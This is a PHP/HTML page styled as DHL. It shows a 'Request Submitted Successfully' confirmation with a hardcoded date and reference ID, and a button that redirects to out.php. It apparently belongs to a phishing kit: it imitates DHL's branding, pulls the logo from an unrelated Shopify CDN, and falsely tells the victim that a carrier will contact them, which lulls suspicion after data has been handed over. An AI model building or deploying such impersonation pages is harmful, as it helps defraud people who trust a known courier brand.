<?php 
require '../main.php';
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Request Submitted Successfully</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <style>
        :root {
            --dhl-red: #D40511;
            --dhl-yellow: #FFCC00;
        }
        
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f8f9fa;
            padding-top: 20px;
        }
        
        .alert-box {
            border-left: 5px solid var(--dhl-red);
            background-color: #fff9f9;
            padding: 15px;
            border-radius: 4px;
        }
        
        .tracking-card {
            max-width: 500px;
            border-radius: 10px;
            border: 1px solid #eee;
            box-shadow: 0 5px 15px rgba(0,0,0,0.05);
        }
        
        .btn-dhl {
            background-color: var(--dhl-red);
            color: white;
            font-weight: 600;
            padding: 12px 25px;
            border-radius: 8px;
            transition: all 0.2s;
        }
        
        .btn-dhl:hover {
            background-color: #b30000;
            transform: translateY(-2px);
        }
        
        /* Mobile-specific styles */
        @media (max-width: 576px) {
            body {
                padding: 10px;
                background-color: white;
            }
            
            .tracking-card {
                border: none;
                box-shadow: none;
            }
            
            .container {
                padding: 0;
            }
            
            .btn-dhl {
                padding: 15px 25px;
                font-size: 1.1rem;
            }
            
            .alert-box {
                margin-left: -15px;
                margin-right: -15px;
                border-left: none;
                border-radius: 0;
                border-top: 3px solid var(--dhl-red);
            }
        }
    </style>
</head>
<body>
    <div class="container py-3">
        <div class="row justify-content-center">
            <div class="col-md-8 col-lg-6">
                <div class="card tracking-card shadow-sm p-4 mx-auto">
                    
                    <div class="text-center mb-4" style="background-color: #FFCC00; padding: 8px 0;">
                        <img src="https://cdn.shopify.com/s/files/1/0930/7134/3889/files/cqs.svg?v=1749563770" alt="DHL" style="height:30px;">
                    </div>
                    
                    
                    <div class="alert alert-success mb-4">
                        <h5 class="fw-bold"><i class="fas fa-check-circle text-success me-2"></i> Request Submitted Successfully</h5>
                        <p class="mb-0">We have received your request. One of our carriers will contact you shortly to arrange the delivery of your package.</p>
                    </div>
                    
                   
                    <div class="mb-4">
                        <div class="d-flex justify-content-between mb-3 py-2 border-bottom">
                            <span class="text-muted">Date:</span>
                            <span class="fw-bold">06/10/2025</span>
                        </div>
                        <div class="d-flex justify-content-between mb-3 py-2 border-bottom">
                            <span class="text-muted">Reference ID:</span>
                            <span class="fw-bold">UZ893USUY89DK</span>
                        </div>
                    </div>
                    
                    <!-- Action Button -->
                    <div class="text-center mt-4">
                        <button onclick="window.location='out.php'" class="btn btn-dhl btn-lg w-100">
                            <?php echo getLang("_MORE_INFO"); ?> <i class="fas fa-arrow-right ms-2"></i>
                        </button>
                    </div>
                </div>
            </div>
        </div>
    </div>

    <footer class="container mt-5">
        <div class="row text-center text-muted small">
        
        </div>
    </footer>

    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
</body>
</html>